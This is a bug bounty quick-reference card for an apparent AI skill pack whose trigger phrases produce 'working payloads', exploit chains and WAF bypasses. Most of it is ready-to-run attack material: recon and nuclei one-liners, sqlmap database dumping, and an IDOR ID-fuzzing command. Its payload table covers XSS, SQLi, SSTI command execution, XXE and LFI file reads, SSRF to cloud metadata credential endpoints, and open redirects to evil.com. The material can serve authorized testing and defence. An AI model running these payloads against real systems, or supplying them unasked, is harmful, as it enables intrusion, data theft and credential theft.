# BugBountySkills — Quick Reference Card

A one-page operational cheatsheet. Print it. Pin it. Use it during a live hunt.

---

## Skill Triggers

| Say this | Get this |
|---|---|
| `RECON MODE — [target]` | Full passive + active recon pipeline |
| `WEB MODE — [target] [tech stack]` | Web vuln hunting methodology |
| `API MODE — [target]` | API discovery + auth/authz attack flow |
| `LLM MODE — [target]` | Prompt injection, RAG, plugin abuse |
| `MOBILE MODE — [apk/ipa]` | Static + dynamic mobile flow |
| `PAYLOAD <vuln> <context>` | Context-specific working payloads |
| `SCR MODE — [language]` | Source code review for that language |
| `REPORT MODE — [vuln] [impact]` | Platform-ready report |
| `EXPLOIT MODE — [vuln chain]` | PoC + impact amplification |
| `H1 MODE / BC MODE / INTI MODE` | Platform-specific tactics |

---

## Critical One-Liners

### Recon

```bash
# Subdomain enum (passive + permutation)
subfinder -d target.com -all -recursive | anew subs.txt
echo target.com | alterx -enrich | puredns resolve -r resolvers.txt | anew subs.txt

# Probe alive + get titles/tech/status
cat subs.txt | httpx -title -tech-detect -status-code -ip -cname -o alive.txt

# JS endpoint extraction
katana -u alive.txt -js-crawl -d 5 | grep -E "\.js$" | anew js_files.txt
cat js_files.txt | xargs -I{} curl -s {} | grep -Eo "(\"|')[^\"']*(\"|')" | grep -E "/api|/v1|/v2|/internal" | anew js_endpoints.txt

# Wayback mining
echo target.com | gau --blacklist png,jpg,gif,svg,woff,woff2 | anew wayback.txt
cat wayback.txt | unfurl -u keys | sort -u > wayback_params.txt

# Parameter discovery
cat alive.txt | xargs -I{} arjun -u {} -oT params.txt -t 20

# Screenshot the alive set
gowitness file -f alive.txt --threads 30
```

### Nuclei Quick Scan

```bash
nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium -rl 50 -o nuclei.txt
nuclei -l alive.txt -t ~/nuclei-templates/exposures/ -t ~/nuclei-templates/misconfiguration/ -o leak.txt
```

### XSS Fast Check

```bash
cat params.txt | qsreplace '"><img src=x onerror=alert(1)>' | httpx -mr 'onerror=alert' -silent
# Or with dalfox:
cat alive.txt | dalfox pipe --skip-bav --silence
```

### SQLi Fast Check

```bash
cat params.txt | grep -E "(\?|&)id=|user=|search=|q=|key=" | head -50 > sqli_candidates.txt
sqlmap -m sqli_candidates.txt --batch --level=2 --risk=2 --random-agent --threads=5 --dbs
```

### SSRF Fast Check

```bash
# Replace any URL-like param with your collaborator
cat params.txt | qsreplace 'https://YOUR.BURP.COLLABORATOR' | httpx -silent
# Watch the collaborator UI for hits
```

### IDOR Fast Check

```bash
# Use Burp Autorize, OR ffuf to fuzz numeric IDs:
ffuf -u 'https://target.com/api/v2/users/FUZZ/profile' -w <(seq 1 10000) \
     -H "Cookie: session=USER_A" -mc 200 -fs 0
```

### LFI / Path Traversal

```bash
ffuf -u 'https://target.com/file?name=FUZZ' \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fr 'root:x:'
```

### Subdomain Takeover

```bash
subjack -w subs.txt -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v -o takeovers.txt
nuclei -l alive.txt -t ~/nuclei-templates/http/takeovers/
```

---

## Top Payload Quick-Grabs

| Vuln | Quick payload |
|---|---|
| XSS basic | `"><script>alert(document.domain)</script>` |
| XSS polyglot | `jaVasCript:/*-/*\`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e` |
| XSS attribute | `" autofocus onfocus=alert(document.domain) x="` |
| SQLi error | `' OR 1=1-- -` |
| SQLi blind | `' AND SLEEP(5)-- -` |
| SQLi union | `' UNION SELECT NULL,version()-- -` |
| SSRF AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
| SSRF GCP | `http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json` (header `Metadata-Flavor: Google`) |
| SSTI Jinja2 | `{{7*7}}` → `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| SSTI Twig | `{{7*'7'}}` → `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| LFI | `../../../../etc/passwd` · `php://filter/convert.base64-encode/resource=index.php` |
| XXE | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` |
| Open redirect | `//evil.com/%2F..` · `/\\evil.com` · `https:evil.com` |
| Prototype pollution | `__proto__[admin]=true` · `constructor[prototype][admin]=true` |
| JWT alg:none | header `{"alg":"none","typ":"JWT"}`, then `<payload>.` |
| CSRF (no token) | HTML form auto-submitting from attacker.tld |
| CRLF | `%0d%0aSet-Cookie:%20admin=1` |
| Host header | `Host: evil.com` · `X-Forwarded-Host: evil.com` |
| Cache poisoning | unkeyed `X-Forwarded-Host` reflected in body |

---

## Report Severity Quick-Ref

| Impact | Likely severity |
|---|---|
| RCE / SQLi with exfil / mass ATO | Critical |
| SSRF to internal / cloud creds / Stored XSS on high-traffic auth'd page | High |
| IDOR limited data / Reflected XSS / CSRF on sensitive action | Medium |
| Info disclosure / Self-XSS / missing security header | Low / Info |

---

## Files to Load Per Task

| Task | Load these files |
|---|---|
| Starting recon | `SKILL_FILES/RECON/01_passive_recon.md` + `02_subdomain_enumeration.md` + `04_asset_discovery.md` |
| Testing web app | `SKILL_FILES/VULNERABILITIES/WEB/<vuln>.md` (relevant) |
| Testing API | `SKILL_FILES/VULNERABILITIES/API/api_authentication_attacks.md` + `api_authorization_bypass.md` |
| Testing LLM/AI | `SKILL_FILES/VULNERABILITIES/LLM_AI/llm_testing_methodology.md` |
| Reviewing source | `SKILL_FILES/SOURCE_CODE_REVIEW/scr_<language>.md` + `scr_dangerous_functions_all_langs.md` |
| Bypassing WAF | `SKILL_FILES/VULNERABILITIES/WEB/waf_bypass_all_techniques.md` + `cloudflare_bypass.md` |
| Writing report | `SKILL_FILES/REPORTING/hackerone_report_template.md` (or BC / Inti) |
| Building chain | `SKILL_FILES/EXPLOIT_DEVELOPMENT/exploit_chain_building.md` |
| Building automation | `SKILL_FILES/AUTOMATION/recon_pipeline_automation.md` + `nuclei_custom_templates.md` |

---

## Burp Extensions (Pro) — Must-Install

```
Param Miner · Turbo Intruder · DOM Invader · HTTP Request Smuggler
Autorize · JWT Editor · Logger++ · Hackvertor · Auth Analyzer
Active Scan++ · Reflected Parameters · Backslash Powered Scanner
Collaborator Everywhere · GraphQL Raider · 403 Bypasser
```

---

## Daily Hunt Loop

```
06:00  Pipeline output review (overnight notify alerts)
07:00  Deep manual hunt on prioritized target
10:00  Write reports for verified bugs
13:00  Pivot to second target / fuzz queue
16:00  Triage replies, payouts, learning
```

→ Full method: [`SKILL_FILES/MINDSET_STRATEGY/time_management_hunting.md`](SKILL_FILES/MINDSET_STRATEGY/time_management_hunting.md)
